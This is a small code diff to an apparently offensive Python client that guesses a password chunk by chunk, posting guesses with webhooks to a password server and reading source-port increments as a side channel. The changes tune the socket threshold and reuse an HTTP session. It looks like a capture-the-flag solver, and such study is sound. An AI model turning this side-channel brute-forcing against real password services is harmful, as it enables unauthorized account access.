@@ -89,7 +89,7 @@ class Client(object):
     #: The minimum of source port increments, ie. a password with the first
     #: chunk wrong. This depends on your network configuration, required DNS
     #: lookups and so on.
-    MIN_SOCKETS = 3
+    MIN_SOCKETS = 2
     #: How much weirdness until we go insane?
     INSANITY = 5
 
@@ -98,6 +98,7 @@ class Client(object):
         self.counter = 0
         self.verified_chunks = []
         self.weirdness = 0
+        self.session = requests.session()
 
         self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS,
                                               self.EXTRA_CONFIRMATIONS)
@@ -126,7 +127,7 @@ class Client(object):
         while self.chunk < self.CHUNKS:
             pw = self.generate_pw()
             payload = json.dumps({"password": pw, "webhooks": webhooks})
-            requests.post(PWDB_URL, data=payload)
+            self.session.post(PWDB_URL, data=payload)
 
             # Block until we receive a result from the server thread.
             result = it_queue.get()
